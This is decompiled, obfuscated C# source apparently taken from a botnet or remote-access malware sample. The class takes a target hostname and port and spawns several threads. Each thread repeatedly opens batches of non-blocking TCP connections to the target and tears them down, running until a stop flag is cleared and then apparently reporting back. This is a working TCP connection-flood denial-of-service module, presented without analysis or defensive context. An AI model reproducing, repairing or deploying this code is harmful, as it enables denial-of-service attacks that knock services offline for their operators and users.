using System;
using System.Net;
using System.Net.Sockets;
using System.Threading;

internal class Class5
{
	private class Class6
	{
		private IPEndPoint ipendPoint_0;

		private Socket[] socket_0;

		private int int_0;

		public Class6(IPEndPoint ipendPoint_1, int int_1)
		{
			ipendPoint_0 = ipendPoint_1;
			int_0 = int_1;
		}

		public void method_0(IAsyncResult iasyncResult_0)
		{
		}

		public void method_1()
		{
			while (bool_0)
			{
				try
				{
					socket_0 = new Socket[int_0];
					for (int i = 0; i < int_0; i++)
					{
						socket_0[i] = Delegate122.smethod_0(Delegate121.smethod_0(ipendPoint_0), SocketType.Stream, ProtocolType.Tcp);
						Delegate129.smethod_0(socket_0[i], bool_0: false);
						AsyncCallback asyncCallback_ = method_0;
						Delegate130.smethod_0(socket_0[i], ipendPoint_0, asyncCallback_, socket_0[i]);
					}
					Delegate82.smethod_2(100);
					for (int i = 0; i < int_0; i++)
					{
						if (Delegate123.smethod_0(socket_0[i]))
						{
							Delegate129.smethod_1(socket_0[i], bool_0: false);
						}
						Delegate128.smethod_0(socket_0[i]);
						socket_0[i] = null;
					}
					socket_0 = null;
				}
				catch
				{
					for (int i = 0; i < int_0; i++)
					{
						try
						{
							if (Delegate123.smethod_0(socket_0[i]))
							{
								Delegate129.smethod_1(socket_0[i], bool_0: false);
							}
							Delegate128.smethod_0(socket_0[i]);
							socket_0[i] = null;
						}
						catch
						{
						}
					}
				}
			}
			for (int i = 0; i < int_0; i++)
			{
				try
				{
					if (Delegate123.smethod_0(socket_0[i]))
					{
						Delegate129.smethod_1(socket_0[i], bool_0: false);
					}
					Delegate128.smethod_0(socket_0[i]);
					socket_0[i] = null;
				}
				catch
				{
				}
			}
		}
	}

	private static ThreadStart[] threadStart_0;

	private static Thread[] thread_0;

	public static string string_0;

	public static int int_0;

	private static IPEndPoint ipendPoint_0;

	public static int int_1;

	private static Class6[] class6_0;

	public static int int_2 = 25;

	public static int int_3 = 5;

	public static bool bool_0 = false;

	public static void smethod_0()
	{
		Thread object_ = Delegate113.smethod_0(smethod_1);
		Delegate114.smethod_0(object_, bool_0: true);
		Delegate115.smethod_0(object_);
	}

	public static void smethod_1()
	{
		try
		{
			ipendPoint_0 = Delegate118.smethod_0(Delegate117.smethod_0(Delegate116.smethod_0(string_0))[0], int_1);
		}
		catch
		{
			ipendPoint_0 = Delegate118.smethod_0(Delegate119.smethod_0(string_0), int_1);
		}
		thread_0 = new Thread[int_3];
		threadStart_0 = new ThreadStart[int_3];
		class6_0 = new Class6[int_3];
		for (int i = 0; i < int_3; i++)
		{
			class6_0[i] = Delegate131.smethod_0(ipendPoint_0, int_2);
			threadStart_0[i] = class6_0[i].method_1;
			thread_0[i] = Delegate113.smethod_0(threadStart_0[i]);
			Delegate115.smethod_0(thread_0[i]);
		}
		Delegate82.smethod_2(int_0 * 1000);
		if (bool_0)
		{
			Delegate65.smethod_2();
			Delegate64.smethod_3(Delegate80.smethod_0(new string[5]
			{
				(string)_003CModule_003E.smethod_0(3518170904u),
				Delegate59.smethod_1(Delegate71.smethod_0((string)_003CModule_003E.smethod_0(3518170310u), string_0)),
				(string)_003CModule_003E.smethod_0(3518170724u),
				Delegate59.smethod_1(Delegate110.smethod_0((string)_003CModule_003E.smethod_0(3518170310u), int_0)),
				(string)_003CModule_003E.smethod_0(3518170783u)
			}), Delegate70.smethod_4());
		}
	}

	public static void smethod_2()
	{
		bool_0 = false;
	}
}
